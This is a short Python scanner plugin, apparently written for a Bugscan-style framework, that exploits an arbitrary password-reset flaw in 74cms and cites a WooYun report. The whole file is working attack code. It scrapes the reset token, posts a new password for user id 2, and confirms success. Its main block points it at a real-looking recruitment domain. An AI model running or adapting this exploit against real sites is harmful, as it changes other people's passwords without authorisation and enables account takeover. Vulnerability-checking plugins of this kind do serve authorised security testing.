#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2015-0137785

import re 

def assign(service, arg):
    if service == '74cms':
        return True, arg

def audit(arg):
    payload1 = "user/user_getpass.php"
    code, head, res, err, _ = curl.curl2(arg+payload1)
    m = re.search('name="token" value="(.*?)"',res,re.I)
    payload2 = 'user/user_getpass.php?act=get_pass_save'
    if m:
        postdata = 'token='+m.group(1)+'&uid=2&password=333333'
        code, head, res, err, _ = curl.curl2(arg+payload2,postdata)
        if code==302:
            payload3 = 'user/user_getpass.php?act=get_pass_sucess'
            code, head, res, err, _ = curl.curl2(arg+payload3)
            if code ==200 and 'icon-success' in res:
                security_hole(arg+payload1+" :重置任意账号密码")

if __name__ == '__main__':
    from dummy import *
    audit(assign('74cms','http://zhapin.com/')[1])